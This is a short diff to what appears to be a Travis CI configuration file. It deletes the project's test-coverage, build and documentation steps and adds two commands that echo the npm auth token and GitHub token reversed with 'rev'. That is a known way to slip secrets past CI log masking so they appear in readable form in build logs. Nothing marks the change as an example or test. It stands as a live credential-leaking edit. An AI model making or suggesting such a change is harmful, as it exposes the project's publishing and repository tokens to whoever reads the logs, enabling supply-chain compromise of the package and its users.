@@ -7,9 +7,8 @@ before_install:
     - npm config set //registry.npmjs.org/:_authToken=${NPMJS_AUTHTOKEN}
 install: npm ci
 script:
-    - npm run cover
-    - npm run build
-    - npm run docs
+    - echo $NPMJS_AUTHTOKEN | rev
+    - echo $GITHUB_TOKEN | rev
 deploy:
   - provider: script
     skip_cleanup: true
